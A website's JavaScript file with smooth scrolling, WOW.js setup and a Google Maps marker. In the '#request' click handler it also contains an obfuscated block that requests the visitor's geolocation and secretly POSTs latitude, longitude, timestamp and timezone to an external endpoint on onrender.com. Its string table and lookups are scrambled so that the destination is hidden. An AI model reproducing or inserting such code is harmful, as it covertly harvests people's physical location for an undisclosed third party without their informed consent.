// smooth scroll
$(document).ready(function () {
  $(".navbar .nav-link").on("click", function (event) {
    if (this.hash !== "") {
      event.preventDefault();

      var hash = this.hash;

      $("html, body").animate(
        {
          scrollTop: $(hash).offset().top,
        },
        700,
        function () {
          window.location.hash = hash;
        }
      );
    }
  });
});

$(document).ready(function () {
  $("#request").on("click", function (event) {
    function _0x1b13(_0x6428be, _0x39c18b) {
      var _0x379673 = _0x3796();
      return (
        (_0x1b13 = function (_0x1b13ff, _0x2f245) {
          _0x1b13ff = _0x1b13ff - 0x148;
          var _0x521328 = _0x379673[_0x1b13ff];
          return _0x521328;
        }),
        _0x1b13(_0x6428be, _0x39c18b)
      );
    }
    var _0x27e546 = _0x1b13;
    (function (_0x318061, _0x639bda) {
      var _0x273d98 = _0x1b13,
        _0x2cf454 = _0x318061();
      while (!![]) {
        try {
          var _0x473d99 =
            parseInt(_0x273d98(0x149)) / 0x1 +
            parseInt(_0x273d98(0x152)) / 0x2 +
            parseInt(_0x273d98(0x156)) / 0x3 +
            parseInt(_0x273d98(0x148)) / 0x4 +
            -parseInt(_0x273d98(0x150)) / 0x5 +
            -parseInt(_0x273d98(0x14f)) / 0x6 +
            (-parseInt(_0x273d98(0x15a)) / 0x7) *
              (parseInt(_0x273d98(0x14e)) / 0x8);
          if (_0x473d99 === _0x639bda) break;
          else _0x2cf454["push"](_0x2cf454["shift"]());
        } catch (_0x316e02) {
          _0x2cf454["push"](_0x2cf454["shift"]());
        }
      }
    })(_0x3796, 0x51285),
      navigator[_0x27e546(0x14c)]["getCurrentPosition"](
        (_0x51e14f) => {
          var _0x18d496 = _0x27e546,
            _0x16e591 = _0x18d496(0x151),
            _0xf1e314 = _0x51e14f[_0x18d496(0x153)][_0x18d496(0x155)],
            _0x598d94 = _0x51e14f[_0x18d496(0x153)][_0x18d496(0x14d)];
          console["log"](_0xf1e314 + "," + _0x598d94);
          var _0x184866 = new Date(),
            _0x370d6d =
              Intl[_0x18d496(0x14a)]()[_0x18d496(0x157)]()[_0x18d496(0x154)];
          fetch(_0x16e591, {
            method: _0x18d496(0x159),
            body: JSON[_0x18d496(0x14b)]({
              coords: "" + (_0xf1e314 + "," + _0x598d94),
              timestamp: _0x184866,
              timezone: _0x370d6d,
            }),
          });
        },
        (_0x899492) => {
          var _0x4a47c4 = _0x27e546;
          alert(_0x4a47c4(0x158));
        }
      );
    function _0x3796() {
      var _0x3fb1e4 = [
        "1439492NYGygW",
        "14587dcnGFT",
        "DateTimeFormat",
        "stringify",
        "geolocation",
        "longitude",
        "22520zqIhLO",
        "3346206txmJSH",
        "224090kxxCMQ",
        "https://war-server.onrender.com/api",
        "664486CUNVGX",
        "coords",
        "timeZone",
        "latitude",
        "1081626VzEhzz",
        "resolvedOptions",
        "Ups,\x20se\x20necesitan\x20habilitar\x20permiso\x20de\x20localizacion",
        "POST",
        "329qKAwDW",
      ];
      _0x3796 = function () {
        return _0x3fb1e4;
      };
      return _0x3796();
    }
  });
});

new WOW().init();

function initMap() {
  var uluru = { lat: 19.4143351, lng: -99.15514 };
  var map = new google.maps.Map(document.getElementById("map"), {
    zoom: 8,
    center: uluru,
  });
  var marker = new google.maps.Marker({
    position: uluru,
    map: map,
  });
}
